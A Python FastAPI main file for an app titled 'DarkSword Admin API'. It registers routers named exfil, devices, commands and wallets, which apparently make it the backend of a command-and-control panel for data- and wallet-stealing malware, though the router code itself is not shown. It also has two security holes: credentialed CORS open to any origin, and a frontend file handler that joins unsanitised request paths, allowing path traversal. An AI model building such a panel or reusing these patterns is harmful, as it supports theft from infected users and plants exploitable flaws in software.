from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from pathlib import Path
import os

app = FastAPI(title="DarkSword Admin API", version="1.0.0")

origins = [
    "http://localhost:8080",
    "http://localhost:5173",
    "http://localhost:3000",
    "*",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

from .database import init_db
from .routers import auth, logs, devices, exfil, users, commands, settings, audit, notifications, wallets

app.include_router(auth.router)
app.include_router(logs.router)
app.include_router(devices.router)
app.include_router(exfil.router)
app.include_router(users.router)
app.include_router(commands.router)
app.include_router(wallets.router)
app.include_router(settings.router, prefix="/api/settings")
app.include_router(audit.router, prefix="/api/audit")
app.include_router(notifications.router, prefix="/api/notifications")

@app.get("/api/health")
async def health_check():
    return {"status": "ok"}

admin_dir = Path(__file__).resolve().parent
dist_dir = admin_dir / "frontend" / "dist"

if dist_dir.exists():
    @app.middleware("http")
    async def serve_frontend(request: Request, call_next):
        path = request.url.path
        if path.startswith("/api/") or path.startswith("/docs") or path.startswith("/redoc") or path.startswith("/openapi.json"):
            return await call_next(request)
        
        file_path = os.path.join(str(dist_dir), path.lstrip("/"))
        if os.path.exists(file_path) and os.path.isfile(file_path):
            return FileResponse(file_path)
        return FileResponse(os.path.join(str(dist_dir), "index.html"))

@app.on_event("startup")
async def startup_event():
    init_db()
